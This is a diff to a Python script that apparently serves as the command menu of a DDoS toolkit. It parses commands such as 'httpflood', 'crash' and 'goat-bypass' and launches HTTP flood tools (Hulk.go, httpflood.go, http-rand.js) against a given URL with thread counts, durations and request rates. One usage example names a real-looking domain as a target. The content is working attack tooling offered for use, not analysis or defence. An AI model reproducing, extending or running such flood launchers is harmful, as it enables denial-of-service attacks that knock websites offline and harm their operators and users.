@@ -339,10 +339,10 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 rps = cnc.split()[3]
-                os.system(f'node method.js {url} {time} request {rps}')
+                os.system(f'node http-rand.js {url} {time}')
             except IndexError:
-                print('Usage: goat-bypass <url> <time> <requests_per_second>')
-                print('Example: goat-bypass http://example-protected-org 30 450')
+                print('Usage: http-rand <url> <time>')
+                print('Example: http-rand http://vailon.com/ 60')
 
         elif "overflow" in cnc:
             try:
@@ -378,7 +378,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
-                os.system(f'./crash -site {url} -data {method}')
+                os.system(f'go run Hulk.go -site {url} -data {method}')
             except IndexError:
                 print('Usage: crash <url> METHODS<GET/POST>')
                 print('Example: crash http://example.com GET')
@@ -389,7 +389,7 @@ def main():
                 thread = cnc.split()[2]
                 method = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'./httpflood {url} {thead} {method} {time} nil')
+                os.system(f'go run httpflood.go {url} {thead} {method} {time} nil')
             except IndexError:
                 print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                 print('Example: httpflood http://example.com 15000 get 60')
